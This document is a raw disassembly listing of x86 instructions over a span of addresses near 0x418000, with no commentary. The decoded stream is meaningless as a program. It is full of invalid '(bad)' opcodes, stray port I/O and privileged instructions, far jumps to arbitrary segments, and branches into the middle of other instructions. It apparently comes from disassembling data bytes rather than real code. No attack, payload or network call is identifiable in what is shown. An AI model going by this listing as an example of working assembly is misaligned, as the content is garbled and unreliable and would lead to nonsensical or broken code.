  418182:	and    DWORD PTR [bx+si-0x7d],0x30
  418187:	mov    BYTE PTR [ebx],al
  418189:	mov    es,ebp
  41818b:	sub    DWORD PTR [eax+0xc8c43ed],ebp
  418191:	pop    ecx
  418192:	and    eax,0xbc36cf27
  418197:	add    al,0xff
  418199:	jae    0x4181bc
  41819b:	outs   dx,BYTE PTR es:[esi]
  41819d:	lahf   
  41819e:	jle    0x418137
  4181a0:	bound  eax,QWORD PTR [eax-0x3e]
  4181a3:	xchg   esi,eax
  4181a4:	fcomp  st(3)
  4181a6:	and    eax,0xf87ac6cd
  4181ab:	stos   DWORD PTR es:[edi],eax
  4181ac:	pop    edi
  4181ad:	sahf   
  4181ae:	das    
  4181af:	mul    DWORD PTR [eax+esi*1+0x77]
  4181b3:	ror    DWORD PTR [ebp+0x43],1
  4181b6:	sti    
  4181b7:	jnp    0x41813a
  4181b9:	add    bh,0x1d
  4181bc:	mov    esi,0x87101a44
  4181c1:	daa    
  4181c2:	out    0x59,al
  4181c4:	jno    0x418155
  4181c6:	lea    edx,[eax]
  4181c8:	cmc    
  4181c9:	shl    BYTE PTR [eax+edi*1-0x2b],0xa3
  4181ce:	xor    al,0x66
  4181d0:	cmp    BYTE PTR [edx],cl
  4181d2:	and    BYTE PTR ds:0x2c5065e7,bl
  4181d8:	push   ss
  4181d9:	pandn  mm2,QWORD PTR [esi]
  4181dc:	jmp    0x1982:0xc068b26b
  4181e3:	lods   al,BYTE PTR ds:[esi]
  4181e4:	ret    0x10dd
  4181e7:	inc    esp
  4181e8:	push   cs
  4181e9:	xchg   ecx,eax
  4181ea:	mov    eax,ds:0xf398423c
  4181ef:	mov    dh,0x34
  4181f1:	push   cs
  4181f2:	cmp    al,0x49
  4181f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181f5:	xchg   BYTE PTR [edi+0x3e],dl
  4181f8:	mov    cl,0xd
  4181fa:	inc    ebp
  4181fb:	je     0x4181e0
  4181fd:	xlat   BYTE PTR ds:[ebx]
  4181fe:	mov    DWORD PTR [ecx],ebx
  418200:	mov    dl,0x45
  418202:	pop    esp
  418203:	mov    ah,0xb4
  418205:	(bad)  
  418206:	or     al,0x40
  418208:	and    BYTE PTR [ebx],dl
  41820a:	popf   
  41820b:	je     0x4181e0
  41820d:	adc    BYTE PTR [ebx-0x15],ah
  418210:	test   bl,ah
  418212:	outs   dx,DWORD PTR ds:[esi]
  418213:	in     al,dx
  418214:	adc    ah,BYTE PTR [edi+0x430ff2a]
  41821a:	lea    ebp,[eax-0x5b8985ff]
  418220:	fstp   TBYTE PTR [edx-0x50]
  418223:	mov    ds:0x412e074e,eax
  418228:	jecxz  0x4181f7
  41822a:	ja     0x4181e5
  41822c:	repz leave 
  41822e:	call   0x2d7434
  418233:	enter  0x550e,0xe
  418237:	ja     0x41820f
  418239:	(bad)  
  41823a:	fdiv   QWORD PTR [edx]
  41823c:	fst    QWORD PTR [edx+0x11b573b7]
  418242:	(bad)  
  418243:	jnp    0x418299
  418245:	rol    BYTE PTR [ebx],cl
  418247:	data16 lahf 
  418249:	add    bh,BYTE PTR [edx]
  41824b:	cdq    
  41824c:	sub    DWORD PTR [eax],0xcf7c9380
  418252:	mov    WORD PTR [ebp+0x4b],ss
  418255:	sbb    esp,DWORD PTR [ecx]
  418257:	cmp    edx,DWORD PTR [esi-0x47b89d15]
  41825d:	lods   eax,DWORD PTR ds:[esi]
  41825e:	fld    DWORD PTR [eax]
  418260:	aaa    
  418261:	mov    esp,0x4aa05ce7
  418266:	push   0x34
  418268:	cmp    eax,0xea7af17d
  41826d:	aaa    
  41826e:	pop    edi
  41826f:	xor    al,0x9b
  418271:	ins    BYTE PTR es:[edi],dx
  418272:	sbb    DWORD PTR [eax],0x449481bb
  418278:	arpl   bp,di
  41827a:	(bad)  
  41827b:	(bad)  
  41827c:	lods   eax,DWORD PTR ds:[esi]
  41827d:	in     eax,0x89
  41827f:	mov    dh,ch
  418281:	jo     0x4182fd
  418283:	sbb    eax,0xa77929ac
  418288:	fimul  DWORD PTR ds:0x19ede31a
  41828e:	add    BYTE PTR [esi-0x9713dd9],ch
  418294:	pop    ecx
  418295:	sbb    DWORD PTR [ebx-0x77191795],0xffffffb0
  41829c:	dec    ebp
  41829d:	pop    esi
  41829e:	fs jo  0x418231
  4182a1:	loopne 0x418232
  4182a3:	outs   dx,BYTE PTR ds:[esi]
  4182a4:	ins    DWORD PTR es:[edi],dx
  4182a5:	mov    eax,ds:0x5ce24413
  4182aa:	mov    esi,0x3a26a9ee
  4182af:	fiadd  WORD PTR [edi+0x6dba810e]
  4182b5:	pop    esp
  4182b6:	cmp    ch,BYTE PTR [ecx-0x49]
  4182b9:	mov    esi,0xd55fa124
  4182be:	cli    
  4182bf:	jbe    0x41830a
  4182c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182c2:	xor    BYTE PTR [ecx],dh
  4182c4:	ins    DWORD PTR es:[edi],dx
  4182c5:	fdiv   st,st(3)
  4182c7:	inc    ebx
  4182c8:	jno    0x4182ac
  4182ca:	loope  0x4182e7
  4182cc:	stc    
  4182cd:	and    eax,0xdb7bdad3
  4182d2:	mov    cl,0xdd
  4182d4:	sub    dh,ch
  4182d6:	pop    DWORD PTR [esi+0x73]
  4182d9:	mov    ah,0xf2
  4182db:	push   edi
  4182dc:	jbe    0x41828e
  4182de:	loop   0x4182db
  4182e0:	fiadd  DWORD PTR [edx+0x10b8bb74]
  4182e6:	push   edx
  4182e7:	test   al,0xbb
  4182e9:	cmp    al,0xf3
  4182eb:	mov    esp,0xbb74d548
  4182f0:	push   ebx
  4182f1:	add    al,0x73
  4182f3:	jmp    FWORD PTR [ebp+ebx*2-0x31]
  4182f7:	xchg   DWORD PTR ss:[ecx-0x3fdd6754],esp
  4182fe:	gs jae 0x41835c
  418301:	sbb    esp,ebp
  418303:	adc    cl,0x72
  418306:	and    BYTE PTR [edi],cl
  418308:	enter  0x2227,0x2a
  41830c:	cmc    
  41830d:	imul   eax,DWORD PTR [ebx-0x5c],0x23
  418311:	jecxz  0x4182d0
  418313:	xor    al,0xe6
  418315:	sbb    esi,0x8
  418318:	es inc ebp
  41831a:	lods   al,BYTE PTR ds:[esi]
  41831b:	mov    edx,0x8ecfa20d
  418320:	pusha  
  418321:	jno    0x4182ea
  418323:	and    ah,BYTE PTR [esi+0x4f]
  418326:	std    
  418327:	jnp    0x4182c5
  418329:	ret    0xa782
  41832c:	stos   DWORD PTR es:[edi],eax
  41832d:	xor    BYTE PTR [ebx+0x121beac8],dh
  418333:	xor    eax,DWORD PTR [edi+0x6d]
  418336:	ret    0x31d6
  418339:	push   edx
  41833a:	outs   dx,BYTE PTR ds:[esi]
  41833b:	push   es
  41833c:	and    al,0x62
  41833e:	or     ch,ah
  418340:	fisub  WORD PTR [eax+0x27]
  418343:	xchg   edx,eax
  418344:	jmp    0x418341
  418346:	stc    
  418347:	stc    
  418348:	repz (bad) 
  41834a:	daa    
  41834b:	mov    edi,0x60412e7d
  418350:	scas   al,BYTE PTR es:[edi]
  418351:	adc    ch,BYTE PTR [edi+0x6778d0c0]
  418357:	test   BYTE PTR [esi+0x1f],bh
  41835a:	adc    eax,0x178a7e6
  41835f:	icebp  
  418360:	dec    edi
  418361:	xchg   edx,eax
  418362:	inc    esi
  418363:	iret   
  418364:	inc    esp
  418365:	cmp    al,0x52
  418367:	ins    DWORD PTR es:[edi],dx
  418368:	fdivrp st(3),st
  41836a:	push   edx
  41836b:	add    eax,0xc7611f19
  418370:	pop    es
  418371:	push   edx
  418372:	imul   esp,DWORD PTR [ebx],0x32fc06f3
  418378:	cmc    
  418379:	mov    ebp,0xbd77e731
  41837e:	add    al,0x3c
  418380:	jnp    0x418385
  418382:	aaa    
  418383:	idiv   DWORD PTR [edx]
  418385:	push   ebx
  418386:	jnp    0x41832a
  418388:	sub    al,0x1e
  41838a:	repnz pop es
  41838c:	jb     0x418408
  41838e:	mov    esi,0x7c407558
  418393:	mov    al,ds:0xc4ca0075
  418398:	pop    esp
  418399:	push   ecx
  41839a:	pop    DWORD PTR [ecx]
  41839c:	sahf   
  41839d:	jb     0x4183a9
  41839f:	mov    ch,0xc6
  4183a1:	jbe    0x418355
  4183a3:	out    dx,eax
  4183a4:	cld    
  4183a5:	cmp    ah,BYTE PTR [ebp+ebx*4+0x3150fbfe]
  4183ac:	cs in  eax,0x9a
  4183af:	xchg   ebx,eax
  4183b0:	outs   dx,BYTE PTR ds:[esi]
  4183b1:	and    dl,BYTE PTR [edi+ebx*4]
  4183b4:	ror    esi,cl
  4183b6:	popa   
  4183b7:	jmp    0xdc34:0xac97
  4183bd:	jnp    0x4183c2
  4183bf:	dec    esp
  4183c0:	in     eax,0x43
  4183c2:	aam    0x90
  4183c4:	jecxz  0x4183a9
  4183c6:	pop    ebp
  4183c7:	xlat   BYTE PTR ds:[ebx]
  4183c8:	push   ss
  4183c9:	cmp    eax,0x578e7632
  4183ce:	and    al,0xdf
  4183d0:	mov    eax,ds:0xeeda60c9
  4183d5:	xchg   ebp,eax
  4183d6:	idiv   DWORD PTR [edx-0x27]
  4183d9:	(bad)  
  4183da:	xchg   edi,eax
  4183db:	jb     0x41838d
  4183dd:	sub    esi,DWORD PTR [edx+edi*1]
  4183e0:	pop    ds
  4183e1:	data16 lahf 
  4183e3:	jo     0x418404
  4183e5:	cmp    ebp,esi
  4183e7:	das    
  4183e8:	mov    edi,0x85392f56
  4183ed:	jb     0x4183be
  4183ef:	call   0xe578:0xd032066c
  4183f6:	(bad)  
  4183f7:	xlat   BYTE PTR ds:[ebx]
  4183f8:	xchg   esp,eax
  4183f9:	cdq    
  4183fa:	les    ebx,FWORD PTR [edi-0x5ad696a5]
  418400:	xchg   esp,eax
  418401:	aaa    
  418402:	cmp    BYTE PTR [eax+0x5d],0x48
  418406:	or     DWORD PTR [ebp-0x650aa23a],ecx
  41840c:	or     DWORD PTR ds:0x7560d430,edx
  418412:	fwait
  418413:	jnp    0x4183ac
  418415:	into   
  418416:	loope  0x418442
  418418:	mov    bl,0xb4
  41841a:	xlat   BYTE PTR ds:[ebx]
  41841b:	inc    ecx
  41841c:	lock inc eax
  41841e:	in     eax,dx
  41841f:	int    0xe
  418421:	and    edi,DWORD PTR [edi+0x281401d6]
  418427:	xor    al,0xa4
  418429:	ja     0x41840e
  41842b:	xchg   ebp,eax
  41842c:	lods   eax,DWORD PTR ds:[esi]
  41842d:	mov    ebx,0x9f0bd491
  418432:	pusha  
  418433:	adc    eax,0x3b836f36
  418438:	pop    ecx
  418439:	xchg   esi,eax
  41843a:	mov    DWORD PTR [ecx],ebx
  41843c:	and    BYTE PTR [ecx-0x56295431],al
  418442:	jnp    0x418493
  418444:	cmp    DWORD PTR [ebp-0x3a160ecf],eax
  41844a:	scas   al,BYTE PTR es:[edi]
  41844b:	stos   DWORD PTR es:[edi],eax
  41844c:	push   edi
  41844d:	(bad)  
  41844e:	test   al,0x7e
  418450:	fstp   DWORD PTR [eax-0xf]
  418453:	(bad)  
  418454:	jmp    0x6dce5ee1
  418459:	sbb    ch,BYTE PTR [edx-0x61]
  41845c:	lods   al,BYTE PTR ds:[esi]
  41845d:	dec    eax
  41845e:	outs   dx,BYTE PTR ds:[esi]
  41845f:	mov    ?,WORD PTR [edi+0x0]
  418462:	mov    esp,0x488221a7
  418467:	or     sp,WORD PTR [ecx]
  41846a:	std    
  41846b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41846c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41846d:	mov    ah,0xb8
  41846f:	jns    0x4184e1
  418471:	outs   dx,DWORD PTR ds:[esi]
  418472:	es jbe 0x4183fc
  418475:	mov    dl,0x46
  418477:	mov    esi,0x575aed23
  41847c:	mov    cl,0xe4
  41847e:	jge    0x4184c3
  418480:	push   cx
  418482:	das    
  418483:	xchg   ebx,eax
  418484:	fsub   QWORD PTR [esi]
  418486:	cmp    al,0x63
  418488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418489:	inc    eax
  41848a:	out    0xd7,eax
  41848c:	fstp   DWORD PTR [ebx]
  41848e:	pop    edx
  41848f:	fidiv  WORD PTR [ebp-0x34]
  418492:	jne    0x4184b9
  418494:	fadd   st(3),st
  418496:	gs hlt 
  418498:	test   DWORD PTR [eax-0x7f1d5c3f],esp
  41849e:	sbb    bh,bl
  4184a0:	cdq    
  4184a1:	out    dx,eax
  4184a2:	xchg   ecx,eax
  4184a3:	test   BYTE PTR [edx-0x2f],0x2f
  4184a7:	xchg   ebx,eax
  4184a8:	jae    0x418438
  4184aa:	pop    es
  4184ab:	or     ebx,esp
  4184ad:	imul   ecx,DWORD PTR [edx+0x261555f],0xffffff9e
  4184b4:	loop   0x418483
  4184b6:	sbb    eax,DWORD PTR [ebp+0x5280b4b0]
  4184bc:	leave  
  4184bd:	sub    al,0x26
  4184bf:	dec    ecx
  4184c0:	adc    eax,0x64fa689c
  4184c5:	inc    ecx
  4184c6:	or     ebx,DWORD PTR [eax-0x14]
  4184c9:	mov    dl,0xf4
  4184cb:	adc    bh,BYTE PTR [edi+edi*8-0x14]
  4184cf:	push   DWORD PTR [edi]
  4184d1:	push   cs
  4184d2:	and    DWORD PTR [eax+edi*4],0xb933500a
  4184d9:	sti    
  4184da:	mov    eax,ds:0x260b1d16
  4184df:	lea    ebp,[ecx]
  4184e1:	jp     0x41854e
  4184e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184e4:	adc    ah,cl
  4184e6:	je     0x4184d3
  4184e8:	mul    BYTE PTR [eax]
  4184ea:	pop    eax
  4184eb:	pop    edi
  4184ec:	addr16 in al,dx
  4184ee:	add    eax,0xc98846
  4184f3:	gs pop ebp
  4184f5:	cwde   
  4184f6:	push   es
  4184f7:	cmp    edx,DWORD PTR [ebx-0x52110f9c]
  4184fd:	mov    edx,0x21a0d310
  418502:	pusha  
  418503:	lea    esi,[edx+0x634e6e25]
  418509:	in     eax,0xc0
  41850b:	inc    edx
  41850c:	imul   edx,DWORD PTR [ebp+0x44a6cd64],0x2d
  418513:	sbb    DWORD PTR [edi],edx
  418515:	addr16 ja 0x418555
  418518:	aad    0x70
  41851a:	jo     0x418512
  41851c:	xchg   ebp,eax
  41851d:	inc    edx
  41851e:	mov    dl,0x67
  418520:	sub    DWORD PTR [ebx-0x18fcbabf],edi
  418526:	jnp    0x418505
  418528:	mov    edi,esp
  41852a:	jecxz  0x4185a0
  41852c:	dec    esi
  41852d:	pusha  
  41852e:	xor    eax,0xf97adbb0
  418533:	add    ecx,DWORD PTR [ecx]
  418535:	inc    esi
  418536:	clc    
  418537:	bound  di,DWORD PTR [edx+ebx*4+0x69182c87]
  41853f:	and    dl,BYTE PTR [esi]
  418541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418542:	jmp    0x418520
  418544:	mov    fs,WORD PTR [edi]
  418546:	(bad)  
  418547:	jbe    0x4185b9
  418549:	aad    0xea
  41854b:	not    BYTE PTR [eax-0x34]
  41854e:	add    al,0x36
  418550:	add    al,0xee
  418552:	ss jb  0x4184e5
  418555:	xchg   DWORD PTR [ebx+eax*8-0x79d5a00d],eax
  41855c:	mov    WORD PTR ds:0xc3337b31,ds
  418562:	fdivp  st(7),st
  418564:	(bad)  
  418565:	push   edx
  418566:	ss ins DWORD PTR es:[edi],dx
  418568:	fsub   QWORD PTR [ecx+0x587e69c5]
  41856e:	xchg   esi,eax
  41856f:	push   0xeb9ecdbe
  418574:	or     dh,BYTE PTR [ebp-0x4557301b]
  41857a:	sbb    bh,bh
  41857c:	stos   DWORD PTR es:[edi],eax
  41857d:	sub    bl,BYTE PTR [ebx-0x48]
  418580:	lds    esi,FWORD PTR [ebp-0x4f]
  418583:	test   dh,0xbc
  418586:	test   edi,eax
  418588:	cld    
  418589:	jl     0x77593435
  41858f:	and    ecx,edx
  418591:	add    bl,ch
  418593:	cld    
  418594:	adc    eax,0x178fc69
  418599:	jmp    0x4185f5
  41859b:	mov    cl,0x76
  41859d:	loope  0x41854e
  41859f:	out    0x7f,eax
  4185a1:	gs sbb ch,bl
  4185a4:	dec    edx
  4185a5:	jne    0x4185a4
  4185a7:	inc    edi
  4185a8:	pop    ss
  4185a9:	xchg   esp,eax
  4185aa:	add    bh,cl
  4185ac:	leave  
  4185ad:	(bad)  
  4185ae:	pop    esp
  4185af:	mov    esp,0x4f398c7b
  4185b4:	cmp    dh,BYTE PTR [ecx+esi*1]
  4185b7:	inc    edi
  4185b8:	cmp    eax,0x4a0fbb1e
  4185bd:	shl    DWORD PTR [ecx-0x27b710d9],0x7a
  4185c4:	jecxz  0x418562
  4185c6:	push   esi
  4185c7:	sub    ecx,DWORD PTR [ecx]
  4185c9:	enter  0xcf6b,0x7d
  4185cd:	inc    eax
  4185ce:	push   0x70
  4185d0:	sub    bl,al
  4185d2:	inc    edi
  4185d3:	mov    bl,0x11
  4185d5:	push   ebp
  4185d6:	cmp    eax,0x4a4fcd6
  4185db:	mov    BYTE PTR [eiz*4-0x387ef6d4],ch
  4185e2:	scas   al,BYTE PTR es:[edi]
  4185e3:	and    DWORD PTR [ebx],ecx
  4185e5:	adc    eax,0xe78282fa
  4185ea:	mov    esi,0x613a5179
  4185ef:	mov    al,0x29
  4185f1:	call   0x7fbb6edd
  4185f6:	jecxz  0x41857e
  4185f8:	xchg   esi,eax
  4185f9:	xchg   esp,eax
  4185fa:	dec    edx
  4185fb:	call   0x68a:0x260653bb
  418602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418603:	retf   
  418604:	into   
  418605:	inc    eax
  418606:	enter  0xe7bd,0x2
  41860a:	in     eax,0x9
  41860c:	xchg   edx,eax
  41860d:	jmp    0xfd20:0x33c0485c
  418614:	sub    DWORD PTR [edx-0x28],esi
  418617:	icebp  
  418618:	jno    0x4185f0
  41861a:	arpl   WORD PTR [ecx+0x7813a70a],bp
  418620:	lods   al,BYTE PTR ds:[esi]
  418621:	daa    
  418622:	inc    eax
  418623:	jle    0x41869a
  418625:	jle    0x4185ba
  418627:	push   ebx
  418628:	jne    0x4185eb
  41862a:	dec    eax
  41862b:	and    DWORD PTR [edi],eax
  41862d:	adc    DWORD PTR [esi-0x78dcefd8],edi
  418633:	jmp    0x4d9563ff
  418638:	jbe    0x4186ad
  41863a:	xlat   BYTE PTR ds:[ebx]
  41863b:	loopne 0x41868f
  41863d:	repnz cld 
  41863f:	mov    WORD PTR [edi],cs
  418641:	pop    ss
  418642:	or     DWORD PTR [edi-0x7f],0x4f
  418646:	xchg   dh,dh
  418648:	popf   
  418649:	push   0xffffffff
  41864b:	jp     0x418616
  41864d:	or     eax,0x8e21a3c0
  418652:	stos   DWORD PTR es:[edi],eax
  418653:	out    dx,al
  418654:	pop    esp
  418655:	mov    dh,0xa9
  418657:	adc    ecx,DWORD PTR [edx]
  418659:	and    DWORD PTR [edx],edx
  41865b:	jnp    0x41869f
  41865d:	pop    esi
  41865e:	loop   0x41861d
  418660:	push   0x47
  418662:	and    BYTE PTR [edx-0x63e07bf9],0xfd
  418669:	test   BYTE PTR [ebx],cl
  41866b:	shr    DWORD PTR [ecx],1
  41866d:	imul   edx,DWORD PTR [ebx],0x8de20a12
  418673:	fs push ebp
  418675:	or     BYTE PTR [ebx-0x6d10e015],ch
  41867b:	and    DWORD PTR [eax],0x5c
  41867e:	inc    esi
  41867f:	loop   0x418602
  418681:	push   ds
  418682:	or     DWORD PTR [ebx+0x3d94ad36],edx
  418688:	(bad)  
  418689:	mov    ecx,0x18df9e02
  41868e:	fcom   DWORD PTR ss:[edx-0x79adad9e]
  418695:	mov    ecx,0xb8a4843f
  41869a:	jae    0x41864c
  41869c:	cmc    
  41869d:	test   BYTE PTR [ecx+0x3cb50cca],bl
  4186a3:	xchg   ecx,eax
  4186a4:	and    al,0x6b
  4186a6:	aam    0xd3
  4186a8:	mov    dl,0xe2
  4186aa:	arpl   si,bx
  4186ac:	inc    esi
  4186ad:	dec    ebx
  4186ae:	xchg   esi,eax
  4186af:	pop    edx
  4186b0:	popf   
  4186b1:	cs inc esi
  4186b3:	ins    DWORD PTR es:[edi],dx
  4186b4:	(bad)  
  4186b5:	jg     0x418661
  4186b7:	mov    DWORD PTR [ebx],eax
  4186b9:	pop    edi
  4186ba:	fs sbb edi,edi
  4186bd:	arpl   bp,cx
  4186bf:	ret    
  4186c0:	pop    edx
  4186c1:	cmp    al,0xb8
  4186c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186c4:	leave  
  4186c5:	fdivrp st(7),st
  4186c7:	sahf   
  4186c8:	mov    ah,0x63
  4186ca:	or     eax,0xf1f6ab2f
  4186cf:	xor    bh,cl
  4186d1:	xchg   ebx,eax
  4186d2:	popf   
  4186d3:	jno    0x4186e4
  4186d5:	outs   dx,BYTE PTR ds:[esi]
  4186d6:	jno    0x418691
  4186d8:	adc    ch,BYTE PTR [eax-0x1f]
  4186db:	cmp    bh,BYTE PTR ds:0x1212a6eb
  4186e1:	fmul   st,st(7)
  4186e3:	repz repnz shr DWORD PTR es:[edx-0x1d],1
  4186e9:	mov    dh,0x21
  4186eb:	mov    DWORD PTR [esi],0x9d1dbc8
  4186f1:	push   0x4b35af37
  4186f6:	std    
  4186f7:	repnz xor eax,0xca98e0fb
  4186fd:	xlat   BYTE PTR ds:[ebx]
  4186fe:	pop    ebx
  4186ff:	mov    ch,0x4e
  418701:	jo     0x418709
  418703:	(bad)  
  418704:	call   0xf02ddfea
  418709:	lods   eax,DWORD PTR ds:[esi]
  41870a:	fsubr  QWORD PTR [edx]
  41870c:	ror    BYTE PTR [esi+0x15cafafc],0x8f
  418713:	cmp    eax,0x6c873a63
  418718:	and    BYTE PTR [eax+0x158353cc],dh
  41871e:	fs pop ebp
  418720:	mov    esp,0xb6cfa8fc
  418725:	cmp    al,ch
  418727:	fdivr  st,st(3)
  418729:	push   esp
  41872a:	jns    0x4186f5
  41872c:	cmp    eax,0xc3c83c8
  418731:	xchg   esi,eax
  418732:	adc    BYTE PTR [edx+esi*4-0xebb27e1],bh
  418739:	loop   0x41872c
  41873b:	add    DWORD PTR [esi+ebx*2+0x3adac54],edx
  418742:	fnstcw WORD PTR [ebx-0x6e]
  418745:	inc    ebx
  418746:	and    al,0xc2
  418748:	loopne 0x418787
  41874a:	test   eax,0x54288d29
  41874f:	enter  0x4e2a,0x82
  418753:	test   bh,al
  418755:	ror    DWORD PTR [ecx+0x22cc19cf],cl
  41875b:	cmp    DWORD PTR [eax+0x50],ebx
  41875e:	icebp  
  41875f:	stc    
  418760:	ja     0x41875d
  418762:	mov    ah,0xe7
  418764:	mov    ch,0xbf
  418766:	pop    edx
  418767:	mov    al,ds:0xa520d851
  41876c:	daa    
  41876d:	jbe    0x4187d3
  41876f:	mov    ebp,ds
  418771:	loop   0x41873c
  418773:	inc    edx
  418774:	sub    cl,BYTE PTR [ebp*1+0x2f12cb5b]
  41877b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41877c:	mov    ecx,0x5d2eca8a
  418781:	pop    ebp
  418782:	cwde   
  418783:	sahf   
  418784:	mov    ebp,0x2e31157d
  418789:	aas    
  41878a:	jp     0x418721
  41878c:	cmp    DWORD PTR [eax-0x5378c3a7],ebx
  418792:	push   es
  418793:	and    edi,ecx
  418795:	mov    edx,0xb9678b1d
  41879a:	scas   al,BYTE PTR es:[edi]
  41879b:	out    dx,ax
  41879d:	add    bh,BYTE PTR [ebx-0x46d7af6c]
  4187a3:	and    DWORD PTR [esi],0x25
  4187a6:	fdiv   QWORD PTR [ebp+0x401a05ea]
  4187ac:	xchg   esp,eax
  4187ad:	pop    ss
  4187ae:	push   esp
  4187af:	sbb    eax,0x9df2f532
  4187b4:	mov    ebp,0xaf6c3cd4
  4187b9:	call   0x5d3e:0x23d50791
  4187c0:	retf   0xdf02
  4187c3:	push   ebp
  4187c4:	sti    
  4187c5:	cmp    DWORD PTR [ebp+0x5b],esi
  4187c8:	jno    0x4187b6
  4187ca:	add    DWORD PTR cs:[edi-0x67006db0],ebp
  4187d1:	pop    eax
  4187d2:	repnz arpl dx,ax
  4187d5:	lods   eax,DWORD PTR ds:[esi]
  4187d6:	arpl   WORD PTR [esi+edx*2+0xc],sp
  4187da:	inc    ecx
  4187db:	es jbe 0x41877a
  4187de:	lods   eax,DWORD PTR ds:[esi]
  4187df:	pusha  
  4187e0:	shl    al,1
  4187e2:	pop    eax
  4187e3:	xlat   BYTE PTR ds:[ebx]
  4187e4:	push   eax
  4187e5:	out    0x28,eax
  4187e7:	sti    
  4187e8:	dec    esp
  4187e9:	lock xor DWORD PTR [ecx+0x4e],esi
  4187ed:	repz push edi
  4187ef:	mov    ?,WORD PTR [ebp+0x1f3e5196]
  4187f5:	jo     0x41879d
  4187f7:	ss jg  0x4187cc
  4187fa:	or     ebp,DWORD PTR ds:0x1e1c6996
  418800:	gs mov bl,0xcc
  418803:	repnz out 0x60,eax
  418806:	xor    bl,BYTE PTR [ecx-0x66045bc]
  41880c:	add    al,0x56
  41880e:	pop    es
  41880f:	dec    ebp
  418810:	out    0x97,al
  418812:	aaa    
  418813:	sub    BYTE PTR [ebp+0x53],cl
  418816:	cli    
  418817:	pop    esp
  418818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418819:	add    DWORD PTR [esi+0x13],ecx
  41881c:	rol    BYTE PTR [esp+esi*4-0x80],1
  418820:	cmc    
  418821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418822:	(bad)  
  418824:	sbb    BYTE PTR [eax+edx*2+0x2bda414],0xfe
  41882c:	out    dx,al
  41882d:	rcl    DWORD PTR [ebx+0x4b422f81],cl
  418833:	test   DWORD PTR [edi-0x6],ecx
  418836:	repz pop edi
  418838:	push   esi
  418839:	xchg   ecx,eax
  41883a:	push   ss
  41883b:	dec    edx
  41883c:	in     eax,dx
  41883d:	add    al,0x91
  41883f:	fcom   QWORD PTR [ebx+0x68f7e9d2]
  418845:	push   0x4a
  418847:	or     DWORD PTR [esi-0x4074f01a],esp
  41884d:	dec    eax
  41884e:	or     BYTE PTR [esi+0x2ff1325c],bl
  418854:	cli    
  418855:	and    BYTE PTR [esi+0x7a],0xe0
  418859:	lock pop ebp
  41885b:	xchg   DWORD PTR [edx+0x3],ecx
  41885e:	fadd   st(5),st
  418860:	shl    BYTE PTR [esi],0x1e
  418863:	mov    dh,0x3e
  418865:	and    eax,0xb70babda
  41886a:	and    esp,DWORD PTR [ebx+eiz*1]
  41886d:	add    BYTE PTR [edi+0x2b83faa7],bl
  418873:	(bad)  
  418874:	xchg   edx,eax
  418875:	mov    ebp,0xae699c8
  41887a:	sbb    esp,esi
  41887c:	cwde   
  41887d:	sub    BYTE PTR [edi+0x1c7dae28],bl
  418883:	std    
  418884:	loop   0x4188f1
  418886:	jle    0x4188e6
  418888:	arpl   WORD PTR [eax+0x4e],cx
  41888b:	arpl   bp,si
  41888d:	icebp  
  41888e:	arpl   bp,ax
  418890:	and    BYTE PTR [ebp-0x509d4c9c],0x32
  418897:	pop    esi
  418898:	add    eax,0x36452018
  41889d:	(bad)  
  41889f:	scas   eax,DWORD PTR es:[edi]
  4188a0:	mov    ds:0xf6669675,al
  4188a5:	arpl   WORD PTR [edx-0x28fb195c],si
  4188ab:	add    bl,BYTE PTR [eax+0x40]
  4188ae:	xchg   edx,eax
  4188af:	mov    dl,0x58
  4188b1:	aam    0x8c
  4188b3:	out    dx,al
  4188b4:	push   ss
  4188b5:	aaa    
  4188b6:	xchg   ebp,eax
  4188b7:	(bad)  
  4188b8:	xchg   esi,eax
  4188b9:	mov    edi,DWORD PTR [edx+0x73]
  4188bc:	pushf  
  4188bd:	ficom  WORD PTR [ebp+0x7]
  4188c0:	ret    
  4188c1:	sbb    al,BYTE PTR [esp+ebp*1-0x41]
  4188c5:	adc    BYTE PTR [ecx],ch
  4188c7:	mov    ds:0xde34d073,eax
  4188cc:	ficom  WORD PTR [edi+0x67bb0bf3]
  4188d2:	ror    DWORD PTR [ebx],1
  4188d4:	mov    ecx,0xa028a8a2
  4188d9:	sub    ecx,DWORD PTR [ebp-0x24bef34e]
  4188df:	push   0xffffffb6
  4188e1:	sub    BYTE PTR [ecx],al
  4188e3:	jp     0x4188d0
  4188e5:	addr16 jp 0x418944
  4188e8:	mov    ebx,DWORD PTR [eax-0x6c936217]
  4188ee:	sahf   
  4188ef:	jbe    0x4188d4
  4188f1:	dec    eax
  4188f2:	inc    ebx
  4188f3:	jmp    0xa211:0xb4af10e1
  4188fa:	mov    cl,BYTE PTR [esi]
  4188fc:	icebp  
  4188fd:	xchg   ecx,eax
  4188fe:	fcomi  st,st(5)
  418900:	and    eax,ecx
  418902:	jmp    0x28fa2140
  418907:	pop    edi
  418908:	xor    al,0x7b
  41890a:	push   es
  41890b:	cs push esi
  41890d:	imul   ebx,edi,0x25bddad2
  418913:	mov    WORD PTR [eax-0x6a],ss
  418916:	push   ecx
  418917:	cmp    DWORD PTR [esi+0x1ddf756c],ebx
  41891d:	xor    DWORD PTR [esi-0x34],ebx
  418920:	aas    
  418921:	(bad)  
  418922:	push   ecx
  418923:	les    edi,FWORD PTR [ebx]
  418925:	or     DWORD PTR [ebx+0x70],esp
  418928:	mov    eax,ds:0x54d3fbe4
  41892d:	add    edi,edx
  41892f:	cs push ebp
  418931:	mov    eax,ds:0xf426bbeb
  418936:	cs addr16 adc eax,0x4edd5b6f
  41893d:	cmp    DWORD PTR [edi+edi*8-0x44b22daa],0x83329efb
  418948:	fmulp  st(7),st
  41894a:	cmp    cl,ah
  41894c:	add    eax,0x3f686ea9
  418951:	(bad)  
  418952:	dec    edx
